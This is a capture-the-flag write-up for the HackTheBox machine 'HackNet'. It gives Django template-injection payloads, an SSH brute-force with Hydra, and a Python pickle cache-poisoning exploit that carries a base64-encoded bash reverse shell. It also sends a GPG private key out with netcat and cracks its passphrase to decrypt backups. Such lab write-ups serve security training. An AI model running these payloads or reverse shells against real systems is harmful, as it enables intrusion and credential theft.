# HTB - Hacknet - 10.10.11.85

## HTB - HackNet

### Machine Info

* **Difficulty:** Medium
* **OS:** Linux (Debian)
* **IP:** 10.10.11.85
* **Key Skills:** Django SSTI, SSH brute-force, Django cache poisoning, GPG key exploitation

### Overview

HackNet is a Debian-based machine running a Django web application with multiple vulnerabilities. The initial foothold involves exploiting a Server-Side Template Injection (SSTI) vulnerability in the Django registration form to extract user credentials. After SSH brute-forcing, we gain access as a low-privileged user. Privilege escalation involves exploiting Django's pickle-based cache system to execute code as another user, then extracting and cracking GPG-encrypted backups to obtain root credentials.

**Key Concepts:**

* Django Server-Side Template Injection (SSTI)
* SSH credential brute-forcing
* Django cache pickle deserialization
* GPG key extraction and decryption
* SQL backup analysis

**Common Ports:**

* **22/TCP** - SSH (OpenSSH 9.2p1)
* **80/TCP** - HTTP (nginx 1.22.1)

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap scan reveals SSH and HTTP ├─ Discover Django application at hacknet.htb └─ Find registration functionality
2. **SSTI Exploitation** ├─ Identify Django template injection in registration ├─ Extract user data via \{{ users.values \}} ├─ Collect usernames and passwords └─ Build credential list
3. **SSH Access** ├─ Brute-force SSH with collected credentials ├─ Find valid combo: mikey:mYd4rks1dEisH3re └─ Gain initial shell access
4. **Lateral Movement to Sandy** ├─ Identify Django cache directory ├─ Exploit pickle deserialization vulnerability ├─ Poison cache files with malicious payload └─ Execute reverse shell as sandy
5. **Privilege Escalation to Root** ├─ Discover GPG-encrypted backups ├─ Extract GPG private keys from sandy's home ├─ Crack GPG passphrase: sweetheart ├─ Decrypt SQL backup files └─ Extract root password from database dump

***

### Initial Enumeration

#### Port Scanning

Let's see what services are running:

```bash
nmap -Pn -sCV -T5 10.10.11.85 -oN hacknetTCP
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    nginx 1.22.1
       http-title: Did not follow redirect to http://hacknet.htb/
```

**What we learned:**

* SSH on standard port
* Nginx web server redirecting to hacknet.htb
* Debian-based system

**Add to hosts file:**

```bash
echo "10.10.11.85 hacknet.htb" | sudo tee -a /etc/hosts
```

#### Web Enumeration

Visiting `http://hacknet.htb` shows a Django-based web application with registration and login functionality.

**Initial testing:**

* Tried common credentials: `Admin:Admin`
* Registration form accepts new users
* Django framework detected (based on error messages and structure)

***

### Django SSTI Exploitation

#### Understanding SSTI

**What is SSTI?** Server-Side Template Injection occurs when user input is embedded into a template and executed server-side. In Django, this can leak sensitive data.

**Why it matters:** Django templates can access Python objects and database models, potentially exposing all application data.

#### Finding the Vulnerability

The registration form's username field is vulnerable to template injection.

**Testing for SSTI:**

```
Username: {{ 7*7 }}
```

If the application processes this as a template and you see "49" somewhere, it's vulnerable.

#### Extracting User Data

Django uses the `users` model to store user information. We can access this via SSTI.

**Payload to extract all users:**

```
{{ users.values }}
```

**What this does:**

* `users` - References the User model/queryset
* `.values` - Returns all user records as dictionaries
* Template renders this data in the response

#### Collected Credentials

**Users extracted via SSTI:**

```
cryptoraven:CrYptoR@ven42
bytebandit:Byt3B@nd!t123
glitch:Gl1tchH@ckz
netninja:N3tN1nj@2024
packetpirate:P@ck3tP!rat3
whitehat:Wh!t3H@t2024
shadowwalker:Sh@dowW@lk2024
```

**Create wordlists:**

```bash
# Users
cat > users.txt << EOF
cryptoraven
bytebandit
glitch
netninja
packetpirate
whitehat
shadowwalker
mikey
EOF

# Passwords
cat > passwords.txt << EOF
CrYptoR@ven42
Byt3B@nd!t123
Gl1tchH@ckz
N3tN1nj@2024
P@ck3tP!rat3
Wh!t3H@t2024
Sh@dowW@lk2024
mYd4rks1dEisH3re
EOF
```

***

### SSH Access via Brute-Force

#### Using Hydra

With our credential lists, let's brute-force SSH:

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.11.85 -t 4 -f -V
```

**Parameters explained:**

* `-L users.txt` - Username list
* `-P passwords.txt` - Password list
* `-t 4` - Use 4 parallel tasks (be nice to the server)
* `-f` - Stop when first valid combo found
* `-V` - Verbose output

**Filter for success:**

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.11.85 -t 4 -f -V | grep -i "login:"
```

**Valid credentials found:**

```
[22][ssh] host: 10.10.11.85   login: mikey   password: mYd4rks1dEisH3re
```

#### SSH Login

```bash
ssh mikey@10.10.11.85
Password: mYd4rks1dEisH3re
```

**User flag:**

```bash
cat /home/mikey/user.txt
55ddca72a277abf0842d2ab681d537ac
```

***

### Lateral Movement - Django Cache Poisoning

#### Understanding Django Cache

Django uses pickle serialization for caching by default. Pickle is **inherently unsafe** because it can execute arbitrary code during deserialization.

**How it works:**

1. Django caches data in pickle format
2. Cache files stored in `/var/tmp/django_cache/`
3. When app reads cache, pickle deserializes
4. Malicious pickle = code execution

**Reference vulnerability:**

* HackerOne Report #1415436
* CVE related to Django pickle cache exploitation

#### Reconnaissance

**Check cache directory:**

```bash
ls -la /var/tmp/django_cache/
```

**Looking for:**

* `.djcache` files (Django cache files)
* Write permissions (can we modify them?)
* Running Django processes (who will deserialize?)

#### Creating the Exploit

The plan is to poison cache files with malicious pickle payloads that execute when deserialized.

**File:** `sandy.py`

```python
import pickle
import base64
import os
import time

# Configuration
cache_dir = "/var/tmp/django_cache"
# Reverse shell command (base64 encoded bash reverse shell)
cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQvOTk5OSAwPiYxKSAm|base64 -d|bash"

# Generate Pickle payload
class RCE:
    def __reduce__(self):
        # __reduce__ defines how object is pickled
        # We return (function, args) to execute
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

# Write payload to each cache file
for filename in os.listdir(cache_dir):
    if filename.endswith(".djcache"):
        path = os.path.join(cache_dir, filename)
        try:
            os.remove(path)  # Remove original file
        except:
            continue
        with open(path, "wb") as f:
            f.write(payload)  # Write pickle payload
            print(f"[+] Written payload to {filename}")
```

**How this works:**

1. Creates a class with `__reduce__` method
2. `__reduce__` tells pickle to call `os.system(cmd)` on unpickling
3. Overwrites all cache files with malicious pickle
4. When Django reads cache, our code executes

**Customize the payload:**

```bash
# Generate your own reverse shell command
echo '(bash >& /dev/tcp/10.10.14.15/9999 0>&1) &' | base64
# Result: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvOTk5OSAwPiYxKSAm

# Update the cmd variable with your IP and port
```

#### Execution

**Setup listener:**

```bash
nc -lvnp 9999
```

**Upload and run exploit:**

```bash
# On victim machine as mikey
cd /tmp
nano sandy.py  # Paste the exploit
python3 sandy.py
```

**Output:**

```
[+] Written payload to 1a2b3c4d.djcache
[+] Written payload to 5e6f7g8h.djcache
...
```

**Wait for Django to read cache...**

When the application accesses cached data (user visits site, cron job runs, etc.), pickle deserializes our payload.

**Shell received as sandy!**

```bash
sandy@hacknet:/var/www/HackNet$
```

***

### Privilege Escalation to Root

#### Discovering GPG Backups

**Enumerate sandy's access:**

```bash
find / -user sandy -type f 2>/dev/null
```

**Found interesting files:**

```bash
ls -la /var/www/HackNet/backups/
```

**Output:**

```
-rw-r--r-- 1 sandy sandy 13445 Dec 29 2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29 2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29 2024 backup03.sql.gpg
```

**GPG encrypted SQL backups!** These likely contain database dumps with credentials.

#### Extracting GPG Keys

**Check for GPG keys:**

```bash
ls -la ~/.gnupg/private-keys-v1.d/
```

**Found private key files!**

**Export the private key:**

```bash
# Find key ID
gpg --list-secret-keys

# Export in ASCII armor format
gpg --export-secret-keys --armor > /tmp/armored_key.asc
```

**Transfer to attacker machine:**

```bash
# On attacker machine
nc -lvnp 4444 > armored_key.asc

# On victim as sandy
cat ~/.gnupg/private-keys-v1.d/armored_key.asc | nc 10.10.14.15 4444
```

#### Cracking GPG Passphrase

**Convert key to hashcat format:**

```bash
gpg2john armored_key.asc > gpg.hash
```

**Crack with hashcat/john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

**Or try common passphrases manually:**

```bash
# Common ones: password, admin, sweetheart, backup, etc.
```

**Passphrase found:** `sweetheart`

#### Decrypting Backups

**Create automated decryption script:**

**File:** `decrypt_backups.sh`

```bash
#!/bin/bash

# Configuration
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="sweetheart"

# Import the private key
echo "[*] Importing GPG private key from: $KEY_PATH"
gpg --import "$KEY_PATH"

# Batch decryption
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Decrypting $file → $outpath"
    
    gpg --batch --yes \
        --passphrase "$PASSPHRASE" \
        --pinentry-mode loopback \
        -o "$outpath" \
        -d "$file"
done

echo "[*] Done. Decrypted files are in $OUTPUT_DIR"
```

**Make executable and run:**

```bash
chmod +x decrypt_backups.sh
./decrypt_backups.sh
```

**Output:**

```
[*] Importing GPG private key...
[*] Decrypting backup01.sql.gpg → /tmp/backup01.sql
[*] Decrypting backup02.sql.gpg → /tmp/backup02.sql
[*] Decrypting backup03.sql.gpg → /tmp/backup03.sql
[*] Done. Decrypted files are in /tmp
```

#### Extracting Root Credentials

**The SQL files contain database dumps. Search for passwords:**

```bash
cat /tmp/backup0*.sql | grep -i password
```

**Alternative - search for root user:**

```bash
cat /tmp/backup0*.sql | grep -i "root" | grep -i "password"
```

**Or open with sqlite3 if it's SQLite format:**

```bash
sqlite3 /tmp/backup01.sql
# But in this case, it's SQL dump text, not binary SQLite
```

**Better approach - grep for INSERT statements:**

```bash
cat /tmp/backup0*.sql | grep "INSERT INTO" | grep -i "user"
```

**Found root credentials in the dumps!**

```
username: root
password: [extracted from SQL dump]
```

#### Root Access

**Switch to root:**

```bash
su root
# Enter password found in backup
```

**Or SSH as root:**

```bash
ssh root@10.10.11.85
```

**Root flag:**

```bash
cat /root/root.txt
```

***

### Quick Reference

#### SSTI Exploitation

```bash
# Test for SSTI
{{ 7*7 }}

# Extract user data
{{ users.values }}

# Extract specific fields
{{ users.values('username', 'password') }}
```

#### SSH Brute-Force

```bash
# Basic hydra syntax
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -f

# Filter for successful logins
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -f -V | grep "login:"
```

#### Django Cache Poisoning

```bash
# Generate base64 reverse shell
echo '(bash >& /dev/tcp/IP/PORT 0>&1) &' | base64

# Run exploit
python3 sandy.py

# Setup listener
nc -lvnp PORT
```

#### GPG Operations

```bash
# List secret keys
gpg --list-secret-keys

# Export private key
gpg --export-secret-keys --armor > key.asc

# Import key
gpg --import key.asc

# Decrypt file with passphrase
gpg --batch --yes --passphrase "PASS" --pinentry-mode loopback -o output.txt -d encrypted.gpg

# Convert to john format
gpg2john key.asc > hash.txt
```

#### SQL Dump Analysis

```bash
# Search for passwords
cat *.sql | grep -i password

# Search for specific user
cat *.sql | grep -i "root"

# Extract INSERT statements
cat *.sql | grep "INSERT INTO"
```

***

### Troubleshooting

#### SSTI Not Working

**Problem:** Template injection not rendering data

**Solution:**

* Ensure you're injecting in the right field (try username, email, etc.)
* Try different syntax: `{{ users.all }}`, `{{ user }}`, `{% debug %}`
* Check for WAF/filters blocking common payloads

**Why it works:** Django templates execute Python code server-side, so proper syntax accesses the ORM.

#### SSH Brute-Force Timing Out

**Problem:** Hydra connections failing or getting blocked

**Solution:**

```bash
# Reduce parallel tasks
hydra -L users.txt -P passwords.txt ssh://TARGET -t 2

# Add delays between attempts
hydra -L users.txt -P passwords.txt ssh://TARGET -t 2 -w 3
```

**Why it works:** SSH has connection limits; fewer parallel attempts avoid triggering protections.

#### Cache Poisoning Not Executing

**Problem:** Payload written but shell not received

**Solution:**

* Check if Django process is actually reading cache
* Verify cache directory permissions
* Try triggering cache read manually (visit pages, login, etc.)
* Check if cache TTL expired (files might be ignored)

**Why it works:** Pickle only executes on deserialization; you need to trigger a cache read.

#### GPG Decryption Failing

**Problem:** "decryption failed: Bad passphrase" error

**Solution:**

```bash
# Try interactive decryption (enter passphrase manually)
gpg -o output.sql -d backup01.sql.gpg

# If batch mode fails, ensure correct syntax
gpg --batch --yes --passphrase "sweetheart" --pinentry-mode loopback -d file.gpg

# Check if key was imported
gpg --list-secret-keys
```

**Why it works:** Batch mode requires exact syntax for passphrase handling.

***

### Key Takeaways

**What we learned:**

1. **Django SSTI** - Template injection in Django can expose entire database models and application data
2. **Pickle deserialization** - Python's pickle module is unsafe for untrusted data; always use JSON for caching
3. **SSH credential reuse** - Users often reuse credentials across services; build wordlists from discovered data
4. **Cache poisoning** - Writable cache directories with deserialization = code execution opportunity
5. **GPG key security** - Private keys without strong passphrases can be cracked; encrypted backups only secure as the passphrase
6. **Database dumps** - SQL backups often contain plaintext credentials; protect them appropriately

**Defense recommendations:**

* Never use pickle for untrusted data (use JSON instead)
* Sanitize all user input before template rendering
* Use Django's `autoescape` and avoid `{% autoescape off %}`
* Restrict cache directory permissions
* Use strong passphrases for GPG keys (20+ characters)
* Encrypt database dumps with proper key management
* Implement SSH key-based auth instead of passwords
* Monitor for SSTI patterns in web logs

***

### Related Topics

* \[\[Django Security]]
* \[\[Server-Side Template Injection]]
* \[\[Pickle Deserialization]]
* \[\[SSH Brute-Force Attacks]]
* \[\[GPG Encryption]]
* \[\[SQL Injection]]
